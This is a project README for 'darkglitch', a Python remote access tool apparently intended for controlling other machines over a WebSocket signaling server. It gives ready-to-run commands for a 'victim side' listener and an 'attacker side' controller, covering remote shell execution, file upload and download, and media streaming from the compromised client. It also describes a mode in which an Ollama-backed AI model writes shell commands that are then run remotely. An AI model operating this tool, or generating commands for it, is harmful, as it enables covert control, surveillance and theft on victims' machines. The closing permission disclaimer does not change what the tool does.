# darkglitch

darkglitch is a lightweight Python proof-of-concept for remote command execution, file transfer, and media streaming over a WebSocket signaling channel. It is intended for authorized security testing and educational use.

## What it supports

- start a listener that registers a client and waits for commands
- list online peers in the same signaling room
- run shell commands remotely
- upload and download files
- stream media from a connected client
- generate a shell command from a natural-language prompt using an AI provider

## Requirements

- Python 3.10+
- dependencies from requirements.txt
- an Ollama instance if you want to use the AI prompt mode

## Installation

From the project root:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

If you want the AI prompt mode, install the Ollama client package as well:

```bash
pip install ollama
```

## Configuration

Edit [core/config.py](core/config.py) to point the client at your signaling server and room:

```python
HOST = "https://your-signal-server.example/"
ROOM = "your-room"
```

## Usage

### 1. Start a listener (victim side)

```bash
python darkglitch.py -l -c
```

### 2. List online peers (attacker side)

```bash
python darkglitch.py -ol
```

### 3. Send a remote command

```bash
python darkglitch.py -c <client_id> "whoami"
```

### 4. Use an AI-generated bash prompt

```bash
python darkglitch.py -ai <client_id> "list all folders in root"
```

This uses an Ollama-backed provider to turn your prompt into a shell command before executing it remotely.

### 5. Upload or download files

```bash
python darkglitch.py -u <client_id> /path/to/local/file /path/to/remote/file
python darkglitch.py -d <client_id> /path/to/remote/file /path/to/local/file
```

### 6. Request a media stream

```bash
python darkglitch.py -s <client_id>
```

### Help and version

```bash
python darkglitch.py -h
python darkglitch.py -v
```

## AI setup

If you want to use the AI prompt mode, make sure Ollama is installed and running:

```bash
ollama serve
ollama pull deepseek-r1:14b
```

You can override the default model and timeout if needed:

```bash
export OLLAMA_MODEL=llama3.2:3b
export OLLAMA_TIMEOUT=60
```

## Notes

This repository is for research and learning only. Do not deploy it against systems or networks without explicit permission.
